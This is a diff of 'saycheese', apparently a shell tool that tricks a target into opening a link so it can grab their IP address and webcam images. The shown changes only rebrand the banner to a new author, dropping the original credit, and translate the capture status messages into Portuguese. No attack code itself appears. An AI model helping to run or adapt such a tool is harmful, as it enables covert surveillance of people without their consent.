@@ -15,7 +15,7 @@ printf "\e[1;92m  ___) | (_| | |_| |\e[0m\e[1;77m |___| | | |  __/  __/\__ \  __
 printf "\e[1;92m |____/ \__,_|\__, |\e[0m\e[1;77m\____|_| |_|\___|\___||___/\___| \e[0m\n"
 printf "\e[1;92m              |___/ \e[0m                                 \n"
 
-printf " \e[1;77m v1.0 coded by github.com/thelinuxchoice/saycheese\e[0m \n"
+printf " \e[1;77m v1.0 coded by Duzinn\e[0m \n"
 
 printf "\n"
 
@@ -70,7 +70,7 @@ while [ true ]; do
 
 
 if [[ -e "ip.txt" ]]; then
-printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
+printf "\n\e[1;92m[\e[0m+\e[1;92m] IP Resgatado!\n"
 catch_ip
 rm -rf ip.txt
 
@@ -79,7 +79,7 @@ fi
 sleep 0.5
 
 if [[ -e "Log.log" ]]; then
-printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m\n"
+printf "\n\e[1;92m[\e[0m+\e[1;92m] Dispositivo Capturado Com Sucesso!\e[0m\n"
 rm -rf Log.log
 fi
 sleep 0.5
